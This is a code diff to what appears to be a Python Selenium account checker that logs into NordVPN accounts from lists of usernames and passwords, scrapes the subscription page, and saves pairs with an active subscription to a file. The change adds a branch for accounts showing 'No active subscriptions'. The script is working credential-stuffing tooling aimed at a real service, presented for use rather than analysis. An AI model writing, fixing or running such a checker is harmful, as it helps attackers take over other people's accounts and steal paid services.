@@ -60,12 +60,17 @@ while index != len(user):
             subscription_page = 'https://my.nordaccount.com/billing/my-subscriptions/'
             browser.get(subscription_page)
             time.sleep(4)
-            text = browser.find_element(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div/div/div/div[1]/div[2]/div').text
-            if 'Active' in text:
-                print(" | {}:{} ---> Success!".format(user[index], password[index]))
-                accounts.write(user[index] + ":" + password[index] + "\n")
+            if browser.find_elements(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p'):
+            	no_sub = browser.find_element(By.XPATH, '//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div/div[1]/p').text
+            	if 'No active subscriptions' in no_sub:
+            		print(" | {}:{} ---> No Active Subscription".format(user[index], password[index]))
             else:
-                print(" | {}:{} ---> Expired!".format(user[index], password[index]))
+            	text = browser.find_element(By.XPATH,'//*[@id="app"]/div[2]/div[2]/div/div[1]/div[3]/div/div[1]/div/div/div/div[1]/div[2]/div').text
+            	if 'Active' in text:
+                	print(" | {}:{} ---> Success!".format(user[index], password[index]))
+                	accounts.write(user[index] + ":" + password[index] + "\n")
+            	else:
+                	print(" | {}:{} ---> Expired!".format(user[index], password[index]))
         else:
             print(" | {}:{} ---> Account not working".format(user[index], password[index]))
         browser.quit()
